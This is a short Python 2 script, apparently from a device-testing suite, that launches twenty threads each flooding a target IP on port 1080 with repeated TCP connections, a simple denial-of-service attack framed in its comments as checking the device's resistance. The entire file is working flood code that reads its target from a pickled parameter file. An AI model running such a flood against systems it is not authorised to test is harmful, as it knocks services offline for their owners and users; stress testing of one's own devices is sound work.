# This is the main DOS group code
# First it will generate DOS (Denial of service) attack on the device while checking if
# the device responds correctly
import socket
import sys
import pickle
from threading import Thread
#  from time import sleep


class Communicator(object):
    def __init__(self, _ip):
        self.partner_ip = _ip

    def communicate(self):
        communicator_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        communicator_socket.connect((self.partner_ip, 1080))


class SimpleDOSCannon(object):
    def __init__(self, _ip):
        self.target_ip = _ip
        self.data = "abcd"

    def attack(self):
        msg = str.encode(self.data)
        index = 0
        while True:
            try:
                #  sleep(1)
                index += 1
                if index % 100 == 0:
                    print index
                cannon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                cannon_socket.connect((self.target_ip, 1080))
                cannon_socket.send(msg)
                receive_data = cannon_socket.recv(512)
                #  print receive_data
                cannon_socket.shutdown
                cannon_socket.close()
                del cannon_socket
            except socket.error, e:
                print e
                cannon_socket.shutdown(socket.SHUT_RDWR)
                cannon_socket.close
                del cannon_socket
                print "Thread has failed!!!"

    def set_target(self,_target):
        self.target_ip = _target

    def aim_at_target(self):
        cannon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            cannon_socket.connect((self.target_ip, 1080))
            cannon_socket.send("Hello")
            print (" Found Target!!!")
        except (IOError, socket.error, socket.herror) as e:
            print e


def collect_param():
    param_file = open('../parameters', 'rb')   # for debug purposes
    # param_file = open('Groups//parameters', 'rb')
    param_list = pickle.load(param_file)
    param_file.close()
    return param_list


def parse_param(param_list):
    parsed_param = {}
    for item in param_list:
        parsed_param[item[0]] = item[1]
    return parsed_param


def thread_routine(_parsed_parameters_main):
    cannon = SimpleDOSCannon(_ip=_parsed_parameters_main['_IP'])
    cannon.aim_at_target()
    print "Preparing to attack"
    cannon.attack()


if __name__ == "__main__":
    NUM_CANNON = 20
    print "This is the DOS group, first we check the device resistance to simple one machine tcp flood attack"
    parameters = collect_param()
    parsed_parameters_main = parse_param(parameters)
    print "Parsed Successfully"
    th = ['']*NUM_CANNON
    for i in range(NUM_CANNON):
        th[i] = Thread(target=thread_routine, args=(parsed_parameters_main, ))
        th[i].start()
